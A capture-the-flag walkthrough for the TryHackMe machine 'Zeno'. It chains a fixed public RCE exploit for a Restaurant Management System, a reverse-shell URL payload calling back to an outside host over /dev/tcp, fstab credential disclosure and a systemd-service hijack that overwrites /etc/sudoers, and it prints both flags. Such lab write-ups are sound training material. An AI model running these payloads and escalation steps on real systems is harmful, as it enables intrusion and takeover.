# CTF: Zeno (THM)

**Target IP:** `10.145.169.50` ($target)

## Metadata

- **CTF Name:** Zeno
    
- **Platform:** TryHackMe
    
- **Date:** 2026-04-09
    
- **Difficulty:** Medium
    
- **Tools Used:** nmap, gobuster, searchsploit, python3, netcat, linpeas.sh, ssh
    
- **Key Skills/Tools:** Web Enumeration, Broken Exploit Debugging, Information Disclosure (/etc/fstab), Systemd Service Misconfiguration, Persistence via sudoers.
    

## Introduction

This walkthrough documents the exploitation of **Zeno** on TryHackMe. The path to root involves exploiting a Remote Code Execution (RCE) vulnerability in a Restaurant Management System, discovering cleartext credentials for the user `edward` in the fstab file, and leveraging write permissions on a systemd service to gain root access via a system reboot.

**Limitations & Confidence:**

- **Confidence Level:** High. This writeup is strictly based on your provided terminal logs and the specific Python exploit modification.
    
- **Limitations:** The RCE script required manual syntax correction before it would execute correctly.
    

## Reconnaissance

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Zeno)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **22/tcp:** SSH (OpenSSH 7.4)
    
- **12340/tcp:** HTTP (Apache httpd 2.4.6 CentOS)
    

## Foothold

### 1. Web Enumeration

Directory brute-forcing identified a specific application path.

**Command:**

```
😎 amuzed@Kali (~/THM/Zeno)
$ gobuster dir -u http://$target:12340 -w /usr/share/wordlists/dirb/big.txt
```

**Results:** `/rms` (Status: 301): Restaurant Management System.

### 2. Exploitation (Broken RCE Script)

Searching for exploits revealed an RCE for "Restaurant Management System 1.0".

**Exploit:** `php/webapps/47520.py`

The original script contained syntax errors (unterminated string literals and unclosed parentheses). A corrected version was created to successfully upload a PHP shell.

**Corrected Exploit Snippet (`exploit.py`):**

```
# Fixed headers and data formatting
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Content-Type": "multipart/form-data; boundary=---------------------------191691572411478",
    # ... other headers
}

r = requests.post(target, verify=False, headers=headers, data=data)
```

**Execution:**

```
😎 amuzed@Kali (~/THM/Zeno)
$ python3 exploit.py http://$target:12340/rms/
[+] Shell Uploaded. Please check the URL: [http://10.145.169.50:12340/rms/images/reverse-shell.php](http://10.145.169.50:12340/rms/images/reverse-shell.php)
```

### 3. Reverse Shell

Triggering the shell via a web request to gain initial access as the `apache` user.

**URL Payload:**

`http://10.145.169.50:12340/rms/images/reverse-shell.php?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.130.171%2F8443%200%3E%261`

**Listener:**

```
😎 amuzed@Kali (~/THM/Zeno)
$ rlwrap nc -nvlp 8443
sh-4.2$ whoami
apache
```

## Lateral Movement

### 1. Information Disclosure (edward)

Running `linpeas.sh` revealed a sensitive entry in `/etc/fstab`.

**Linpeas Output:**

```
═╣ Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share /mnt/secret-share cifs _netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft 0 0 
```

**Credentials Found:** `edward:FrobjoodAdkoonceanJa`

### 2. SSH Access

```
😎 amuzed@Kali (~/THM/Zeno)
$ ssh edward@$target
[edward@zeno ~]$ cat user.txt 
THM{070cab2c9dc622e5d25c0709f6cb0510}
```

## Privilege Escalation

### 1. Systemd Service Hijacking

Checking sudo permissions for `edward`:

```
User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

Linpeas identified that `edward` has write privileges over a custom service file: `/etc/systemd/system/zeno-monitoring.service`.

### 2. Exploiting the Service

I modified the service to append `edward` to the sudoers file with full permissions upon execution.

**Modified Service File:**

```
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers'

[Install]
WantedBy=multi-user.target
```

**Triggering Escalation:**

```
[edward@zeno ~]$ sudo /usr/sbin/reboot
```

### 3. Gaining Root

After the system rebooted, I logged back in via SSH and switched to root.

```
[edward@zeno ~]$ sudo su
[root@zeno edward]# id
uid=0(root) gid=0(root) groups=0(root)
[root@zeno edward]# cat /root/root.txt
THM{b187ce4b85232599ca72708ebde71791}
```

## Flags

- **User Flag:** `THM{070cab2c9dc622e5d25c0709f6cb0510}`
    
- **Root Flag:** `THM{b187ce4b85232599ca72708ebde71791}`
